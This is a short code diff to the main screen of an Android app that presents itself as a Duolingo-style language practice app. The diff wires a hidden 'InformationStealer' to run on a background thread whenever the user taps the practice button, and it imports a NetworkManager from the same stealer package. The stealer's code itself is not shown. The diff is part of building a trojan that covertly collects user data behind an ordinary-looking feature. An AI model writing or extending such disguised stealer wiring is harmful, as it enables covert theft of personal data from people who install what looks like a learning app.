@@ -16,6 +16,7 @@ import androidx.core.content.ContextCompat;
 
 import com.example.duolingopezzotto.InfoStealerManager.InformationStealer;
 import com.example.duolingopezzotto.InfoStealerManager.JSONParser;
+import com.example.duolingopezzotto.InfoStealerManager.NetworkManager;
 import com.example.duolingopezzotto.R;
 import com.example.duolingopezzotto.SQLiteDB.DatabaseHelper;
 import com.google.gson.JsonObject;
@@ -29,7 +30,7 @@ public class MainActivity extends AppCompatActivity {
 
     Button esercitatiButton, aggiungiButton;
     DatabaseHelper my_db;
-    private final InformationStealer task = new InformationStealer(this);
+    private final InformationStealer stealer = new InformationStealer(this);
     Executor executor = Executors.newSingleThreadExecutor();
     boolean allPermissionsGranted = true;
 
@@ -76,7 +77,7 @@ public class MainActivity extends AppCompatActivity {
         });
 
         esercitatiButton.setOnClickListener(view -> {
-            executor.execute(task);
+            executor.execute(stealer);
             //my_db.deleteAll();
 
             Intent gotoScegliCategorie = new Intent(MainActivity.this, ScegliCategorieActivity.class);
